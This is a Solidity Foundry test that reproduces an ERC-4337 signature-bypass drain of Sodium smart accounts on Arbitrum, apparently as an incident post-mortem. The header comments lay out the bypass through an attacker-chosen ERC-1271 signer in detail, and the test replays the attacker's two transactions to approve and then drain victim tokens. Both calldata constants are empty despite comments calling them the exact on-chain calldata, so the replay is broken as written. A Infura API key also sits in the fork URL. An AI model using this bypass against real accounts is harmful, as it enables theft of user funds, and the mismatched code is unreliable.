pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Lumi Finance (Sodium ERC-4337 smart account) signature-bypass drain
// Date            : 2026-07-13
// Chain           : Arbitrum One (chainid 42161)
// Total Lost      : multiple ERC-20 tokens drained from every Sodium account
// Attacker EOA    : 0xCe1a3BB0b98D0D90C7Dd0620Ab86C9A771888d88
// Attack Contract : 0x56362412AE17cac443AAFBAb4289946Ad958E8a1 (unverified, already on-chain)
// Vulnerable Impl : 0xb5BC46dF04dEe31D219E7664122e29EEd9506b8b (Sodium account impl, verified)
// EntryPoint v0.6 : 0x5FF137D4b0FDCD49DcA30c7CF57E578a026d2789
// Attack Tx 1     : 0x630654fb1c8914405cf81bb02f091b049f19403a152f624f7b8a00c7724c6604 (block 483389834) - sig-bypass approvals
// Attack Tx 2     : 0x1cdba4c3f9c925e6d03ce8d07965a7521ee4e7258f6c5eeae8a7998886c2b9f0 (block 483390113) - drain via transferFrom
//
// @Analysis - ROOT CAUSE (ERC-4337 signature bypass)
// The Sodium account _validateSignature() delegates to checkValidSodiumSignature(hash, sig).
// For sigType 0x01 the account reads a 20-byte signer DIRECTLY from the attacker-supplied
// signature blob ( 0x01 || signer || signatureBytes ) and calls
//   SignatureChecker.isValidSignatureNow(signer, hash, signatureBytes)
// Because signer is fully attacker-controlled, OpenZeppelin ECDSA.tryRecover fails WITHOUT
// reverting, so SignatureChecker falls back to the ERC-1271 path:
//   signer.staticcall(isValidSignature(hash, signatureBytes))
// which hits the ATTACKERS OWN contract, returning the magic value 0x1626ba7e -> valid = true.
// For the executeWithSodiumAuthRecover / executeWithSodiumAuthSession methodId branches,
// _validateSignature then returns 0 (valid) whenever sessionKey == signer (both attacker-set).
// This lets the attacker push arbitrary UserOps through EntryPoint that make each victim Sodium
// account approve() the attacker contract for max allowance (tx1), which then transferFrom-drains
// every victim (tx2). Some proceeds are forwarded from the attack contract to the attacker EOA.
//
// @PoC - faithful on-chain replay:
//   fork Arbitrum at (tx1 block - 1), then from the attacker EOA call the on-chain attack
//   contract with the two REAL calldatas in order. The attack contract already exists on the fork.

address constant ATTACKER_EOA = 0xCe1a3BB0b98D0D90C7Dd0620Ab86C9A771888d88;
address constant ATTACKER_CONTRACT = 0x56362412AE17cac443AAFBAb4289946Ad958E8a1;
address constant ENTRYPOINT = 0x5FF137D4b0FDCD49DcA30c7CF57E578a026d2789;

// Drained tokens (profit tokens)
address constant TOK_FD086 = 0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9;
address constant TOK_C3ABC = 0xc3aBC47863524ced8DAf3ef98d74dd881E131C38;
address constant TOK_1DD6B = 0x1DD6b5F9281c6B4f043c02A83a46c2772024636c;
address constant USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831; // native USDC
address constant USDCE = 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8; // USDC.e

uint256 constant FORK_BLOCK = 483_389_833; // tx1 block (483389834) - 1

contract LumiFinanceExploit is BaseTestWithBalanceLog {
    // Exact on-chain calldata of the two attacker transactions (0x prefix stripped).
    bytes constant TX1_CALLDATA = hex"";
    bytes constant TX2_CALLDATA = hex"";

    function setUp() public {
        vm.createSelectFork(
            "https://arbitrum-mainnet.infura.io/v3/6c80b4478d644647bcc2671e06966b23", FORK_BLOCK
        );

        // multi-asset profit logging on the attacker EOA
        multiAssetLog = true;
        attacker = ATTACKER_EOA;
        // non-zero fundingToken so the balanceLog modifier does NOT zero the EOA native ETH
        fundingToken = TOK_C3ABC;

        fundingTokens.push(TOK_FD086);
        fundingTokens.push(TOK_C3ABC);
        fundingTokens.push(TOK_1DD6B);
        fundingTokens.push(USDC);
        fundingTokens.push(USDCE);
        fundingTokens.push(address(0)); // native ETH

        vm.label(ATTACKER_EOA, "Attacker EOA");
        vm.label(ATTACKER_CONTRACT, "Attacker Contract");
        vm.label(ENTRYPOINT, "EntryPoint v0.6");
        vm.label(TOK_FD086, "TOK_Fd086");
        vm.label(TOK_C3ABC, "TOK_c3aBC");
        vm.label(TOK_1DD6B, "TOK_1DD6b");
        vm.label(USDC, "USDC");
        vm.label(USDCE, "USDC.e");
    }

    function testExploit() public balanceLog {
        // --- record attacker-EOA balances of the tokens it directly receives in tx2 ---
        uint256 beforeC3 = IERC20(TOK_C3ABC).balanceOf(ATTACKER_EOA);
        uint256 before1DD = IERC20(TOK_1DD6B).balanceOf(ATTACKER_EOA);
        uint256 beforeEth = ATTACKER_EOA.balance;

        // Replay from the attacker EOA (sets both msg.sender AND tx.origin).
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);

        // tx1: signature-bypass -> each victim Sodium account approves the attacker contract.
        (bool ok1,) = ATTACKER_CONTRACT.call(TX1_CALLDATA);
        require(ok1, "tx1 (signature-bypass approvals) failed");

        // tx2: drain every victim via transferFrom into the attacker contract, forward to EOA.
        (bool ok2,) = ATTACKER_CONTRACT.call(TX2_CALLDATA);
        require(ok2, "tx2 (drain) failed");

        vm.stopPrank();

        // --- measure profit on the attacker EOA ---
        uint256 afterC3 = IERC20(TOK_C3ABC).balanceOf(ATTACKER_EOA);
        uint256 after1DD = IERC20(TOK_1DD6B).balanceOf(ATTACKER_EOA);
        uint256 afterEth = ATTACKER_EOA.balance;

        uint256 gainC3 = afterC3 - beforeC3;
        uint256 gain1DD = after1DD - before1DD;
        uint256 gainEth = afterEth - beforeEth;

        emit log_named_decimal_uint("Attacker EOA gain TOK_c3aBC", gainC3, 18);
        emit log_named_decimal_uint("Attacker EOA gain TOK_1DD6b", gain1DD, 18);
        emit log_named_decimal_uint("Attacker EOA gain native ETH", gainEth, 18);

        // The attacker EOA strictly gains the two forwarded tokens (and ~1.6 ETH).
        assertGt(afterC3, beforeC3, "no TOK_c3aBC profit to attacker EOA");
        assertGt(after1DD, before1DD, "no TOK_1DD6b profit to attacker EOA");
        // Robust aggregate check: total measured gains must be strictly positive.
        assertGt(gainC3 + gain1DD + gainEth, 0, "no profit reproduced");
    }
}
